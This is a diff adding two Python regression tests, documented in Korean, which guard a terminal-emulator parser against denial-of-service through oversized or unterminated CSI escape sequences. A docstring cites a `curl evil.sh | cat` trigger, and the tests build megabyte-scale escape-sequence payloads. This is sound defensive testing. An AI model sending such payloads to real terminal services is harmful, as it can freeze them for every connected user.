@@ -221,6 +221,59 @@ async def test_osc_large_body_bounded_no_quadratic():
     assert dscr.display[0].strip() == "XY", repr(dscr.display[0])
 
 
+async def test_csi_excess_params_not_quadratic():
+    """[보안 F1 회귀, 2026-07-17] 과다 파라미터 CSI(신뢰 불가 패널 출력)가 서버를
+    행/DoS 시키지 않는다.
+
+    회귀 전: R2 수정(`_call_csi` 가 TypeError 마다 `p.pop()` 후 재시도)이 크래시를
+    DoS 로 바꿨다 — 재시도마다 N-튜플을 다시 쌓아 O(N²). 실측 128KB 한 줄 = **4.76초**
+    이벤트루프 정지(단일 스레드 → 전 클라·전 패널 동결), 입력 2배마다 4배, 1MB≈수 분.
+    트리거는 `curl evil.sh | cat` 한 번이면 충분했다.
+
+    **절대 시간이 아니라 스케일링 비율**을 본다 — 느린 CI 러너에서 플레이크가 나지
+    않으면서 O(N²) 는 확실히 잡는다(이차면 비율 4.0, 선형이면 ~2.0)."""
+    def feed_secs(kb):
+        n = kb * 1024 // 2
+        data = b"\x1b[" + b"1;" * n + b"H"          # H=cursor_position, arity 2
+        p = Pane(-1, -1, 80, 24)
+        t0 = time.perf_counter()
+        p.feed(data)
+        return time.perf_counter() - t0
+
+    t1 = feed_secs(64)
+    t2 = feed_secs(128)                              # 입력 2배
+    # 선형이면 ~2배. 이차면 ~4배. 3.0 을 경계로 두면 러너 노이즈엔 둔감하고 O(N²)엔 민감.
+    ratio = t2 / max(t1, 1e-6)
+    assert ratio < 3.0, f"입력 2배에 시간 {ratio:.1f}배 — O(N²) 회귀(F1)"
+    # 절대 상한은 아주 넉넉히(행 자체를 잡는 안전망). 수정 후 실측 0.023s.
+    assert t2 < 2.0, f"128KB CSI feed 가 {t2:.2f}s — F1 회귀 의심"
+
+
+async def test_csi_raw_param_buffer_bounded():
+    """[보안 F2 회귀, 2026-07-17] 미종결 CSI 파라미터 본문(`_raw`)은 _RAW_MAX 로 캡된다.
+
+    N1(OSC)의 **살아남은 형제**: `_OSC_MAX` 만 있고 `_raw` 엔 상한이 없어, 종결자 없는
+    `ESC[` + 숫자 스트림이 ① `self._raw += ch` 의 O(n²) 로 CPU 를 태우고(400k자=1.15s,
+    10MB=120초+) ② **종결자가 없어도 되므로** feed 를 넘어 본문이 영구 잔류해 메모리
+    DoS 가 됐다. 캡은 자원 상한과 O(n) 을 동시에 준다."""
+    cols, rows = 20, 3
+    big = b"\x1b[" + b"1" * 3_000_000                # 미종결 — 종결자 일부러 없음
+    chunks = [big[i:i + 65536] for i in range(0, len(big), 65536)]
+    scr = pyte.Screen(cols, rows)
+    tok = VTTokenizer(scr)
+    t0 = time.perf_counter()
+    for c in chunks:
+        tok.feed(c)
+    dt = time.perf_counter() - t0
+    assert dt < 2.0, f"미종결 CSI 3MB 가 {dt:.2f}s — O(n²) 회귀(F2)"
+    assert len(tok._raw) <= VTTokenizer._RAW_MAX, f"_raw 미캡 {len(tok._raw)}"
+    # 캡 뒤에도 파서는 정상 복귀한다: 종결자를 만나면 시퀀스를 닫고 이후 글자는 출력.
+    # (캡된 파라미터가 거대 행번호로 해석돼 커서는 마지막 행에 클램프되므로 행을
+    # 특정하지 않고 화면 어딘가에 찍혔는지만 본다 — 요지는 "파서가 안 죽었다"이다.)
+    tok.feed(b"Htail")
+    assert any("tail" in row for row in scr.display), repr(scr.display)
+
+
 async def test_osc_split_across_feeds_matches_pyte():
     """OSC(ST=ESC\\ 종결)가 청크 경계로 잘려도 증분 상태로 본문을 이어 흡수하고,
     pyte.ByteStream 과 동일 화면(타이틀 포함)을 낸다. ESC 가 feed 끝에 걸려 ST 를
